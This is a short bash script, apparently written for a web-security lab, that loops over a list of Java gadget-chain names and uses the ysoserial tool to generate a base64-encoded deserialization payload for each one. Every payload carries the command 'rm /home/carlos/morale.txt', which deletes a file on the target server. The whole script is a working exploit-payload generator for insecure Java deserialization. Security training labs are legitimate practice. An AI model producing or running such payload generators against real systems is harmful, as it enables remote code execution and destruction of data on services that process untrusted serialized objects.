#!/bin/bash


while read payloadname; 
do 
PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH java -jar ~/Desktop/tools/ysoserial-all.jar $payloadname  "rm /home/carlos/morale.txt" | base64 | tr -d "\n" > $payloadname; done < ./javagadgets.txt